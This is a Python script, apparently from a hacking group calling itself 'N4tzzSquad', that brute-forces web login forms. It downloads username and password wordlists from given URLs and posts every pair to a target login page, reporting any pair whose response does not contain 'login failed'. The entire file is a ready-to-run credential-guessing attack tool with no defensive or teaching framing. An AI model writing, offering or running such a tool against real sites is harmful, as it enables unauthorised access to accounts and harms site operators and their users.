#!/usr/bin/env python3

import requests

# Banner
def print_banner():
    banner = """
    ███╗   ██╗██╗  ██╗████████╗███████╗███████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
    ████╗  ██║██║  ██║╚══██╔══╝╚══███╔╝╚══███╔╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
    ██╔██╗ ██║███████║   ██║     ███╔╝   ███╔╝     ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
    ██║╚██╗██║╚════██║   ██║    ███╔╝   ███╔╝      ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
    ██║ ╚████║     ██║   ██║   ███████╗███████╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
    ╚═╝  ╚═══╝     ╚═╝   ╚═╝   ╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
    """
    print("\033[1;37;41m" + banner + "\033[0m")

# Function to download file from URL
def download_file(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.splitlines()
    except requests.RequestException as e:
        print(f"Failed to download file: {e}")
        return []

# Brute force attack function
def brute_force_attack(url, username, password):
    data = {
        'username': username,
        'password': password
    }
    try:
        response = requests.post(url, data=data)
        if "login failed" not in response.text.lower():
            return True
    except requests.RequestException as e:
        print(f"Request error: {e}")
    return False

def main():
    print_banner()

    # Input details from the user
    url = input("URL (e.g., http://example.com/login): ").strip()
    if not url.startswith('http'):
        print("Invalid URL. It should start with 'http://' or 'https://'.")
        return

    # URL to the raw files on GitHub
    username_url = input("URL to username list (raw GitHub URL): ").strip()
    password_url = input("URL to password list (raw GitHub URL): ").strip()

    # Download username and password lists
    usernames = download_file(username_url)
    passwords = download_file(password_url)

    if not usernames or not passwords:
        print("Failed to load username or password lists.")
        return

    # Perform brute force attack
    for username in usernames:
        for password in passwords:
            print("N4tzzSquad Cracking Password!!!")
            if brute_force_attack(url, username, password):
                print(f"[*] Success! Username: {username}, Password: {password}")
                return
            else:
                print(f"[-] Incorrect password: {password}")

    print("[!] No valid password found.")

if __name__ == "__main__":
    main()
